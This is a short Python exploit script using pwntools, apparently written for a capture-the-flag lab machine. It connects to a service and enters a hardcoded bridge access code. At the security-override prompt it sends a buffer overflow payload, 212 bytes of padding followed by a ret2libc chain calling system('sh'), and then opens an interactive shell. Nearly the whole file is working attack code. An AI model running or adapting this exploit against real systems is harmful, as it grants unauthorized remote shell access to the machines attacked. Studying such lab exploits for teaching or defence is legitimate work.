# @author memN0ps, Alamot and Filippos 
import time
import struct
from pwn import *
from subprocess import call

# Change host and ip address here
global RHOST
global RPORT
RHOST = "10.10.10.61"
RPORT = 32812

#context(os = 'linux', arch = 'i386')

"""def debug():
    DEBUG = False
    if DEBUG:
        context.log_level = 'debug'
    else:
        context.log_level = 'info'"""

def conv(num):
    return struct.pack("<I", num)

# This function generates the payload
def generatePayload():
    # There is a EIP overwrite at 212 bytes
    payload = "A" * 212
    payload += conv(0xf7e4c060)  # system()
    payload += conv(0xf7e3faf0)  # exit()
    payload += conv(0xf7f6ddd5)  # 'sh'

    return payload

"""
This function connects to the remote host on a given port then waits until its prompted for "Enter Bridge Access Code: ".
After that "picarda1" is sent. We then waits until prompted "Waiting for input: ", number 4 (Security) option is sent.
Finally when prompted for "Enter Security Override: " the malicious payload is sent, giving us a interactive shell.
"""
def sendPayload(payload):
    #This is the first part of the exploitation
    r = remote(RHOST, RPORT)
    r.recvuntil("Enter Bridge Access Code: ")
    r.sendline("picarda1")

    # This is the second part of the exploitation
    r.recvuntil("Waiting for input: ")
    r.sendline("4")
    r.recvuntil("Enter Security Override:")
    r.sendline(payload)
    print("######################PAYLOAD SENT###################################\n")
    r.interactive()


def main():
    print("######################GENERATING PAYLOAD#############################\n")
    payload = generatePayload()
    print("######################PAYLOAD GENERATED#############################\n")

    print("######################SENDING PAYLOAD################################\n")
    sendPayload(payload)

if __name__ == '__main__':
    main()
